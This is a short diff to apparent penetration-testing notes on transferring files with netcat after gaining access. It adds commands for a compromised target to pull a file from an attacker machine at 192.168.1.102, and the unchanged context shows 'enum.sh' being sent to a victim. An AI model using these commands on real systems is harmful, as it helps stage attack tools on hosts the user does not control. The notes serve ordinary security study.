@@ -4,6 +4,22 @@
 ### Netcat
 The easiest way normally is to use netcat. 
 
+If you can't have an interactive shell it might be risky to start listening on a on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because  that will destroy your sessions.
+
+So instead you can connect from the target machine like this.
+
+On attacking machine:
+```
+nc -lvp 4444 < file
+```
+On target machine:
+
+```
+nc 192.168.1.102 4444 > file
+```
+
+You can of course also do it the other way around:
+
 So on the victim-machine we run nc like this:
 ```
 nc -lvp 3333 > enum.sh
